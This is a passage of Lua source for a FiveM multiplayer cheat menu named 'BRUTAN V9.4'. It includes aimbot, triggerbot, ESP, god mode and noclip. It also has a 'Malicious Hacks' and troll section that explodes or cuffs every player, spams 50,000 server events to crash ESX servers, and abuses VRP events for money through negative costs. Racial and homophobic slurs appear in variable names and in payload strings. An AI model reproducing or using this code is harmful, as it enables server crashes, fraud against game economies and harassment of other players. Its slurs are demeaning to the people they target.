            if freezePlayer then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
            end

            if crosshair then
                ShowHudComponentThisFrame(14)
            end
			
			if ci then
                local cK = false
                local cL = 130
                local cM = 0
                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
                        ped = GetPlayerPed(i)
                        blip = GetBlipFromEntity(ped)
                        x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                        x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                        distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                        if cK then
                            if NetworkIsPlayerTalking(i) then
                                local cN = d(1.0)
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                    cN.r,
                                    cN.g,
                                    cN.b
                                )
                            else
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                    255,
                                    255,
                                    255
                                )
                            end
                        end
                        if distance < cL then
                            if not cK then
                                if NetworkIsPlayerTalking(i) then
                                    local cN = d(1.0)
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                        cN.r,
                                        cN.g,
                                        cN.b
                                    )
                                else
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                        255,
                                        255,
                                        255
                                    )
                                end
                            end
                        end
                    end
                end
            end

            if crosshair2 then
                ch("~r~+",0.495,0.484)
            end

            if crosshair3 then
                ch("~r~.",0.4968,0.478)
            end

            local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)

            if fall then
                for i = 0, 128 do
                    ClearPedTasksImmediately(GetPlayerPed(i))
                end
            end

			if freezeall then
				for i = 0, 128 do
						TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
						TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
						TriggerServerEvent("cuffServer", GetPlayerServerId(i))
						TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent("esx_handcuffs:cuffing", GetPlayerServerId(i))
						TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i))
					end
				end
			
            if blowall then
                for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    AddExplosion(coords.x, coords.y, coords.z, 4, 100.0, false, true, 0.0, false)
                end
            end

            if sall then
                for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    local vehiclehash = GetHashKey("savage")
                    RequestModel(vehiclehash)
                    CreateVehicle(vehiclehash, coords.x, coords.y, coords.z, GetEntityHeading(ped), 1, 0)
                end
            end

            if IsPedInAnyVehicle(PlayerPedId()) then
                if driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end


                if superGrip then
                    SetVehicleGravityAmount(niggerVehicle, 20.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if enchancedGrip then
                    SetVehicleGravityAmount(niggerVehicle, 12.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if fdMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.5)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 4.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 1.0)
                end

                if t2x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),2.0)
                end

                if t4x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),4.0)
                end

                if t8x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),8.0)
                end

                if t16x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),16.0)
                end
            end


            if Noclip then
        local noclip_speed = 1.0
        local ped = GetPlayerPed(-1)
        local x,y,z = getPosition()
        local dx,dy,dz = getCamDirection()
        local speed = noclip_speed
		SetEntityVisible(GetPlayerPed(-1), false, false)
		SetEntityInvincible(GetPlayerPed(-1), true)
		SetEntityVisible(ped, false);

      -- reset velocity
      SetEntityVelocity(ped, 0.0001, 0.0001, 0.0001)
      if IsControlPressed(0, 21) then
          speed = speed + 3
          end
      if IsControlPressed(0, 19) then
          speed = speed - 0.5
      end
      -- forward
             if IsControlPressed(0,32) then -- MOVE UP
              x = x+speed*dx
              y = y+speed*dy
              z = z+speed*dz
               end

      -- backward
               if IsControlPressed(0,269) then -- MOVE DOWN
              x = x-speed*dx
              y = y-speed*dy
              z = z-speed*dz
               end
        SetEntityCoordsNoOffset(ped,x,y,z,true,true,true)
            else
            SetEntityVisible(GetPlayerPed(-1), true, false)
            SetEntityInvincible(GetPlayerPed(-1), false)

         end

            if DeleteGun then
                local gotEntity = getEntity(PlayerId())
                if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
                    drawNotification("Aim The Gun At An Entity And Shoot!")
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
                    if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
                        if IsPlayerFreeAiming(PlayerId()) then
                            if IsEntityAPed(gotEntity) then
                                if IsPedInAnyVehicle(gotEntity, true) then
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
                                        DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotification("~g~Deleted!")
                                    end
                                else
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotification("~g~Deleted!")
                                    end
                                end
                            else
                                if IsControlJustReleased(1, 142) then
                                    SetEntityAsMissionEntity(gotEntity, 1, 1)
                                    DeleteEntity(gotEntity)
                                    drawNotification("~g~Deleted!")
                                end
                            end
                        end
                    end
                end
            end
			
			if explodevehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, true, true, false)
					end
				end
			end
			
            if esp then
                for i = 0, 64 do
                    if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
                        local ra = RGBRainbow(1.0)
                        local pPed = GetPlayerPed(i)
                        local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
                        local x, y, z = table.unpack(GetEntityCoords(pPed))
                        local message =
                            "~h~Name: " ..
                            GetPlayerName(i) ..
                                "\nServer ID: " ..
                                    GetPlayerServerId(i) ..
                                        "\nPlayer ID: " .. i .. "\nDist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
                        if IsPedInAnyVehicle(pPed, true) then
                            local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
                            message = message .. "\nVeh: " .. VehName
                        end
                        DrawText3D(x, y, z + 1.0, message, ra.r, ra.g, ra.b)

                        LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                        LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                        LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                        LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                        LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

                        TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                        TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                        TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

                        ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                        ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                        ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                        ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                        ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

                        DrawLine(
                            LineOneBegin.x,
                            LineOneBegin.y,
                            LineOneBegin.z,
                            LineOneEnd.x,
                            LineOneEnd.y,
                            LineOneEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            LineTwoBegin.x,
                            LineTwoBegin.y,
                            LineTwoBegin.z,
                            LineTwoEnd.x,
                            LineTwoEnd.y,
                            LineTwoEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            LineThreeBegin.x,
                            LineThreeBegin.y,
                            LineThreeBegin.z,
                            LineThreeEnd.x,
                            LineThreeEnd.y,
                            LineThreeEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            LineThreeEnd.x,
                            LineThreeEnd.y,
                            LineThreeEnd.z,
                            LineFourBegin.x,
                            LineFourBegin.y,
                            LineFourBegin.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            TLineOneBegin.x,
                            TLineOneBegin.y,
                            TLineOneBegin.z,
                            TLineOneEnd.x,
                            TLineOneEnd.y,
                            TLineOneEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            TLineTwoBegin.x,
                            TLineTwoBegin.y,
                            TLineTwoBegin.z,
                            TLineTwoEnd.x,
                            TLineTwoEnd.y,
                            TLineTwoEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            TLineThreeBegin.x,
                            TLineThreeBegin.y,
                            TLineThreeBegin.z,
                            TLineThreeEnd.x,
                            TLineThreeEnd.y,
                            TLineThreeEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            TLineThreeEnd.x,
                            TLineThreeEnd.y,
                            TLineThreeEnd.z,
                            TLineFourBegin.x,
                            TLineFourBegin.y,
                            TLineFourBegin.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            ConnectorOneBegin.x,
                            ConnectorOneBegin.y,
                            ConnectorOneBegin.z,
                            ConnectorOneEnd.x,
                            ConnectorOneEnd.y,
                            ConnectorOneEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            ConnectorTwoBegin.x,
                            ConnectorTwoBegin.y,
                            ConnectorTwoBegin.z,
                            ConnectorTwoEnd.x,
                            ConnectorTwoEnd.y,
                            ConnectorTwoEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            ConnectorThreeBegin.x,
                            ConnectorThreeBegin.y,
                            ConnectorThreeBegin.z,
                            ConnectorThreeEnd.x,
                            ConnectorThreeEnd.y,
                            ConnectorThreeEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            ConnectorFourBegin.x,
                            ConnectorFourBegin.y,
                            ConnectorFourBegin.z,
                            ConnectorFourEnd.x,
                            ConnectorFourEnd.y,
                            ConnectorFourEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )

                        DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
                    end
                end
            end

			if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
				SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
			end

            if rainbowTint then
                for i = 0, #allWeapons do
                    if HasPedGotWeapon(PlayerPedId(), GetHashKey(allWeapons[i])) then
                        SetPedWeaponTintIndex(PlayerPedId(), GetHashKey(allWeapons[i]), math.random(0, 7))
                    end
                end
            end

            if showCoords then
                kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl,ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
                roundx=tonumber(string.format("%.2f",kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc))
                roundy=tonumber(string.format("%.2f",riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl))
                roundz=tonumber(string.format("%.2f",ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw))
                bf("~r~X:~s~ "..roundx,0.05,0.00)
                bf("~r~Y:~s~ "..roundy,0.11,0.00)
                bf("~r~Z:~s~ "..roundz,0.17,0.00)
            end

            if bulletGun then
                local startDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                local endDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                startDistance = startDistance + 0.25
                endDistance = endDistance + 1000.0

                if IsPedOnFoot(PlayerPedId()) and IsPedShooting(PlayerPedId()) then
                    local bullet = GetHashKey(bullets[selectedBullet])
                    if not HasWeaponAssetLoaded(bullet) then
                        RequestWeaponAsset(bullet, 31, false)
                        while not HasWeaponAssetLoaded(bullet) do
                            Citizen.Wait(0)
                        end
                    end
                    ShootSingleBulletBetweenCoords(add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).z, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).z, 250, true, bullet, PlayerPedId(), true, false, -1.0)
                end

            end

            if vehicleGun then
                local heading = GetEntityHeading(PlayerPedId())
                local model = GetHashKey(vehicles[selectedVehicle])
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local camPosition = GetGameplayCamCoord()
                local playerPosition = GetEntityCoords(PlayerPedId(), true)
                local spawnDistance = GetDistance(camPosition, playerPosition)
                spawnDistance = spawnDistance + 5
                local spawnPosition = add(camPosition, multiply(dir, spawnDistance))

                RequestModel(model)
                while not HasModelLoaded(model) do
                    debugPrint("Loading Model...")
                    Citizen.Wait(0)
                end

                if HasModelLoaded(model) then
                    if IsPedShooting(PlayerPedId()) then
                        if IsPedOnFoot(PlayerPedId()) then
                        local veh = CreateVehicle(model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                        SetModelAsNoLongerNeeded(model)
                        SetVehicleAsNoLongerNeeded(veh)
                        end
                    end
                end
            end

            if pedGun then
                local heading = GetEntityHeading(PlayerPedId())
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local camPosition = GetGameplayCamCoord()
                local playerPosition = GetEntityCoords(PlayerPedId(), true)
                local spawnDistance = GetDistance(camPosition, playerPosition)
                spawnDistance = spawnDistance + 5
                local spawnPosition = add(camPosition, multiply(dir, spawnDistance))

                local model = GetHashKey(peds[selectedPed])

                RequestModel(model)
                while not HasModelLoaded(model) do
                    Citizen.Wait(0)
                end

                if HasModelLoaded(model) then
                    if IsPedShooting(PlayerPedId()) then
                        local spawnedPed = CreatePed(26, model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
                        SetEntityRecordsCollisions(spawnedPed, true)
                        for f = 0.0, 75.0 do
                            if HasEntityCollidedWithAnything(spawnedPed) then break end
                                ApplyForceToEntity(spawnedPed, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
                        end
                    end
                end
            end

            if forceGun then
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local heading = GetEntityHeading(PlayerPedId())
                if IsPedShooting(PlayerPedId()) then
                    local aiming, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
                    if aiming then
                        if IsPedInAnyVehicle(entity) then
                            local veh = GetVehiclePedIsUsing(entity)
                            DeleteEntity(entity)
                            SetEntityHeading(veh, heading)
                            SetVehicleForwardSpeed(veh, 150.0)
                        else
                            for i = 0, 10 do
                                ApplyForceToEntity(entity, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
                            end
                        end
                    end
                end
            end

            if explosiveAmmo then
                local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                if impact then
                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
                end
            end

			if RainbowVeh then
                local dq = k(1.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
            end
			
            if aimbot then
                for i = 0, 128 do
                    if i ~= PlayerId() then
                        if IsPlayerFreeAiming(PlayerId()) then
                            local TargetPed = GetPlayerPed(i)
                            local TargetPos = GetEntityCoords(TargetPed)
                            local Exist = DoesEntityExist(TargetPed)
                            local Dead = IsPlayerDead(TargetPed)

                            if Exist and not Dead then
                                local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                                if IsEntityVisible(TargetPed) and OnScreen then
                                    if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
                                        local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                                    end
                                end
                            end
                        end
                    end
                end
            end

			            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                if IsControlPressed(0, 209) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
                elseif IsControlPressed(0, 210) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
                end
            end
			
            if TriggerBot then
                local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
                if Aiming then
                    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                        ShootPlayer(Entity)
                    end
                end
            end

            if fastrun then
                SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
                SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
            end
			
			if godmode then
			SetEntityInvincible(GetPlayerPed(-1), true)
			SetPlayerInvincible(PlayerId(), true)
			SetPedCanRagdoll(GetPlayerPed(-1), false)
			ClearPedBloodDamage(GetPlayerPed(-1))
			ResetPedVisibleDamage(GetPlayerPed(-1))
			ClearPedLastWeaponDamage(GetPlayerPed(-1))
			SetEntityProofs(GetPlayerPed(-1), true, true, true, true, true, true, true, true)
			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), false)
			SetEntityCanBeDamaged(GetPlayerPed(-1), false)
		else
			SetEntityInvincible(GetPlayerPed(-1), false)
			SetPlayerInvincible(PlayerId(), false)
			SetPedCanRagdoll(GetPlayerPed(-1), true)
			ClearPedLastWeaponDamage(GetPlayerPed(-1))
			SetEntityProofs(GetPlayerPed(-1), false, false, false, false, false, false, false, false)
			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), true)
			SetEntityCanBeDamaged(GetPlayerPed(-1), true)
		end

            if SuperJump then
                SetSuperJumpThisFrame(PlayerId())
            end
			
			if ePunch then
				SetExplosiveMeleeThisFrame(PlayerId())
			end

            if Oneshot then
                SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
                local gotEntity = getEntity(PlayerId())
                if IsEntityAPed(gotEntity) then
                    if IsPedInAnyVehicle(gotEntity, true) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        end
                    end
                elseif IsEntityAVehicle(gotEntity) then
                    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                        if IsControlJustReleased(1, 69) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    else
                        if IsControlJustReleased(1, 142) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
            end
        end
    end)

Citizen.CreateThread(
    function()

        local currentTint = 1
        local selectedTint = 1

        Plane.CreateMenu("MainMenu", "BRUTAN V9.4")
        Plane.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
        Plane.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
        Plane.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
        Plane.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
        Plane.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
        Plane.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
        Plane.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
        Plane.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
        Plane.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
        Plane.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
        Plane.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
        Plane.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
		Plane.CreateSubMenu("AI", "MainMenu", "AI Menu")
		Plane.CreateSubMenu("Credits", "MainMenu", "Credits")
        Plane.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options")
        Plane.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
        Plane.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
        Plane.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
        Plane.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
        Plane.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
        Plane.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
        Plane.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
        Plane.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
        Plane.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
        Plane.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
        Plane.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
        Plane.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
        Plane.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
        Plane.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
        Plane.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
        Plane.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")

        local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
                            "ESXMenu", "ESXJobMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu",
                            "TeleportMenu", "LSC", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu",
                            "PlayerESXTriggerMenu", "BulletGunMenu", "TrollMenu", "WeaponCustomization", "WeaponTintMenu",
                            "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "SingleWepPlayer", "VehBoostMenu",
                            "ESXMiscMenu", "ESXDrugMenu", "AI", "Credits", "VRPMenu"}


        while Enabled do
            if Plane.IsMenuOpened("MainMenu") then
                drawNotification("~h~~b~BRUTAN ~s~V9.4")
                drawNotification("~h~~s~Made by ~b~Brutan#3927")
                if Plane.MenuButton    ("Self Menu", "SelfMenu") then
                elseif Plane.MenuButton("Teleport Menu", "TeleportMenu") then
				elseif Plane.MenuButton("AI Menu", "AI") then
                elseif Plane.MenuButton("~b~Online~s~ Players", "OnlinePlayersMenu") then
                elseif Plane.MenuButton("Weapon Menu", "WeaponMenu") then
                elseif Plane.MenuButton("Vehicle Menu", "VehMenu") then
                elseif Plane.MenuButton("Malicious Hacks", "MaliciousMenu") then
                elseif Plane.MenuButton("Trolling Options", "TrollMenu") then
                elseif Plane.MenuButton("~g~ESX~s~ Options", "ESXMenu") then
                elseif Plane.MenuButton("~b~VRP~s~ Options", "VRPMenu") then
				elseif Plane.MenuButton("~g~~h~Credits", "Credits") then
                elseif Plane.Button("~h~~r~Disable Menu") then
                    Enabled = false
                end

                Plane.Display()
            elseif Plane.IsMenuOpened("VRPMenu") then
                if Plane.Button("VRP PayGarage 100$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100})
                elseif Plane.Button("VRP PayGarage 1000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -1000})
                elseif Plane.Button("VRP PayGarage 10 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
                elseif Plane.Button("VRP PayGarage 100 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
                elseif Plane.Button("VRP Get Driver Licence") then
                    TriggerServerEvent("dmv:success")
                elseif Plane.Button("VRP Bank Deposit") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:deposit", amount)
                elseif Plane.Button("VRP Bank Withdraw") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:withdraw", amount)
                elseif Plane.Button("VRP Slot Machine") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("vrp_slotmachine:server:2", amount)
                end

                Plane.Display()
            elseif Plane.IsMenuOpened("TrollMenu") then
                if Plane.Button("ESX Server Crasher") then
                    for i = 1, 50000 do TriggerServerEvent("esx_skin:responseSaveSkin", {niggers = "gay"}) TriggerServerEvent("esx_skin:responseSaveSkin", "niggers eat shit") end
                elseif  Plane.CheckBox(
                    "Send everyone to jail",
                    banallusers,
                    function(enabled)
                    banallusers = enabled
                    end)
                then
				elseif Plane.Button("Spawn moutain Lion On Everyone") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 128 do
                        local co = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
